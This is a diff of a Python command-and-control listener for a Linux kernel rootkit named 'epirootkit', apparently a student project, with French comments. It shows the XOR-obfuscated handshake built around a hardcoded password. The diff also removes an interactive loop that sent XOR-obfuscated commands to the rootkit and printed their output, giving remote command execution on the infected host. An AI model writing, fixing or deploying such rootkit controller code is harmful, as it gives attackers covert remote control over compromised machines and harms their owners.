@@ -9,13 +9,14 @@ def xor(data: bytes) -> bytes:
 
 def handle_client(client):
     try:
-        # Envoyer le mot de passe CHIFFRÉ avec un saut de ligne
+        # Envoyer le mot de passe chiffré
         password = b"epirootkit\n"  # Doit correspondre exactement au password dans le module kernel
         encrypted_pass = xor(password)
         client.sendall(encrypted_pass)
 
         # Recevoir et déchiffrer la réponse
-        auth_response = xor(client.recv(2048)).decode(errors="ignore")
+        auth_response_encrypted = client.recv(2048)
+        auth_response = xor(auth_response_encrypted).decode(errors="ignore")
         print("--- AUTH ---")
         print(auth_response.strip())
         print("------------\n")
@@ -23,38 +24,6 @@ def handle_client(client):
         if "FAIL" in auth_response:
             print("Authentication failed. Exiting.")
             return
-
-        while True:
-            cmd = input("epirootkit> ").strip()
-            if not cmd:
-                continue
-
-            # Envoyer la commande chiffrée
-            encrypted = xor(cmd.encode() + b"\n")  # Ajouter un saut de ligne
-            client.sendall(encrypted)
-
-            print("\n--- Response ---")
-            buffer = ""
-
-            while True:
-                chunk = client.recv(2048)
-                if not chunk:
-                    print("Connection closed by kernel module.")
-                    return
-
-                decrypted = xor(chunk).decode(errors="ignore")
-                if "--EOF--" in decrypted:
-                    buffer += decrypted.replace("--EOF--", "")
-                    break
-                buffer += decrypted
-
-            print(buffer.strip())
-            print("---------------\n")
-
-    except KeyboardInterrupt:
-        print("\nExiting client.")
-    finally:
-        client.close()
 
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
